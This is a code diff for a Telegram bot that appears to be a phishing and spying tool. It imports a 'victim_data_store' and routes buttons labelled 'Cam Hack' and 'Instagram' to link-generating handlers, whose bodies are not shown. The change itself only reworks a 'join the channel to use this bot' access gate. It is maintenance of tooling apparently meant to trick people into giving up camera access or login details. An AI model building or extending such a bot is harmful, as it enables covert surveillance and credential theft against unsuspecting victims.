@@ -17,7 +17,9 @@ from bot.server import app
 from bot.utils.storage import link_cache, victim_data_store
 
 bot = telebot.TeleBot(BOT_TOKEN)
-joined_users = set()
+
+# ========== STORE VERIFIED USERS ==========
+verified_users = set()  # Users who have verified joining @nrtecno2
 
 # ========== BOTTOM BUTTONS ==========
 
@@ -35,7 +37,7 @@ def get_bottom_buttons():
     )
     return markup
 
-# ========== JOIN BUTTONS ==========
+# ========== JOIN & VERIFY BUTTONS ==========
 
 def get_join_buttons():
     markup = InlineKeyboardMarkup(row_width=1)
@@ -50,22 +52,39 @@ def get_join_buttons():
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.chat.id
-    if user_id in joined_users:
+
+    # Check if user is already verified
+    if user_id in verified_users:
         show_main_menu(message)
         return
+
+    # Not verified → show join & verify buttons
     bot.send_message(
         user_id,
-        "🔐 *Access Restricted*\n\nYou must join @nrtecno2 to use this bot.\n\n👉 [Join @nrtecno2](https://t.me/nrtecno2)\n\nAfter joining, click the button below.",
+        "🔐 *Access Restricted*\n\n"
+        "You must join @nrtecno2 to use this bot.\n\n"
+        "👉 [Join @nrtecno2](https://t.me/nrtecno2)\n\n"
+        "After joining, click the button below to verify.",
         reply_markup=get_join_buttons(),
         parse_mode="Markdown"
     )
 
+# ========== VERIFY CALLBACK ==========
+
 @bot.callback_query_handler(func=lambda call: call.data == "verify_join")
 def verify_join(call):
     user_id = call.from_user.id
-    joined_users.add(user_id)
-    bot.answer_callback_query(call.id, "✅ Verified!")
-    bot.send_message(user_id, "✅ Welcome! You can now use all features.", reply_markup=get_bottom_buttons(), parse_mode="Markdown")
+
+    # Add user to verified set
+    verified_users.add(user_id)
+
+    bot.answer_callback_query(call.id, "✅ Verified! You can now use the bot.")
+    bot.send_message(
+        user_id,
+        "✅ *Welcome!*\n\nYou can now use all features.",
+        reply_markup=get_bottom_buttons(),
+        parse_mode="Markdown"
+    )
 
 # ========== MAIN MENU ==========
 
@@ -93,10 +112,16 @@ def route_buttons(message):
     text = message.text
     user_id = message.chat.id
 
-    if user_id not in joined_users:
-        bot.send_message(user_id, "❌ You must join @nrtecno2 first. Send /start again.", reply_markup=get_join_buttons())
+    # Check if user is verified
+    if user_id not in verified_users:
+        bot.send_message(
+            user_id,
+            "❌ You must join @nrtecno2 first. Send /start again.",
+            reply_markup=get_join_buttons()
+        )
         return
 
+    # Route to buttons
     if text == "📸 Cam Hack":
         handle_cam_hack(bot, message, get_bottom_buttons)
     elif text == "📸 Instagram":
@@ -160,6 +185,11 @@ def handle_inline(call):
     # Generic copy
     if data == "copy":
         bot.answer_callback_query(call.id, "✅ Select and copy the link manually!")
+        return
+
+    # Verify join (already handled above, but keep for safety)
+    if data == "verify_join":
+        verify_join(call)
         return
 
 # ========== RUN BOT ==========
